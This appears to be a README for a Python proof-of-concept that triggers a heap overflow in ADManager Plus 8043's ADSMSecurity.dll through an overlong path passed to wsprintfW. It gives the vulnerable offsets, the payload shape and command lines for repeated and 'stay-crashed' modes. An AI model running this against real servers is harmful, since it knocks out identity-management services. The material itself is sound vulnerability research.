# F4 Crash PoC - ADManager Plus 8043 / ADSMSecurity.dll - Fixed

## Overview
Fixed and runnable version of F4 heap-overflow PoC: `wsprintfW(malloc(0x208), "%s\*.*", path)` at `sub_0x7410+0x74a4` -> `0xC0000374`.

## Features Implemented

### 1. Payload + Function Name Printed at Crash (NEW)
Every crash now prints **payload that triggered it** and **function name**:

```
[CRASH] PAYLOAD THAT TRIGGERED HEAP CORRUPTION:
  Function: sub_0x7410 (ADSMSecurity.dll + 0x7410) - recursive delete-tree walker
  Vulnerable call: wsprintfW( malloc(0x208), "%s\*.*", path ) at sub_0x7410+0x74a4
  Payload length: 1000 chars
  Payload (preview): C:\AAAAA...AAAAA [len=1000]
  Payload full (first 200): C:\AAAA...
```

- Worker (real + sim) prints PAYLOAD, FUNCTION, VULN at overflow input and at crash
- Main prints `[MAIN] CRASH DETECTED - PAYLOAD AND FUNCTION:` with DLL+RVA
- Sustain prints PAYLOAD/FUNCTION each iteration
- Status JSON (`f4_crash_state.json`) now includes `payload`, `payload_preview`, `function`, `function_rva`

```bash
python f4_crash_poc.py --len 1000
python f4_crash_poc.py --len 300 --attempts 1
```

### 2. Stay-Crashed Mode - Observable From Outside
Keeps vulnerable path in permanently crashed state:

```bash
python f4_crash_poc.py --stay-crashed --len 1000
python f4_crash_poc.py --stay-crashed --len 1000 --duration 60 \
  --status-file ./f4_crash_state.json \
  --indicator-file ./f4_crashed.lock \
  --keep-alive 2
python f4_crash_poc.py --stay-crashed --len 1000 --http-port 8080
curl http://localhost:8080/
cat f4_crash_state.json   # contains payload + function
ls -l f4_crashed.lock
```

### 3. Keep-Alive Hold
Keeps child alive holding DLL for N seconds:

```bash
python f4_crash_poc.py --control --keep-alive 10
python f4_crash_poc.py --len 100 --keep-alive 5
python f4_crash_poc.py --len 1000 --keep-alive 5
```

### 4. Classic Modes
```bash
python f4_crash_poc.py --control
python f4_crash_poc.py --len 100
python f4_crash_poc.py --len 1000
python f4_crash_poc.py --sustain --len 1000 --duration 60
```

## Fixes Applied
- Duplicate broken main() fixed
- %s escaping bug fixed
- POSIX exit truncation handled (23 = 0xC0000417)
- Cross-platform simulation + guards
- Added keep-alive + stay-crashed observable + payload printing

## Safety
Non-existent path, throwaway child only, lab authorized only.

## Requirements
Python 3.8+ stdlib only
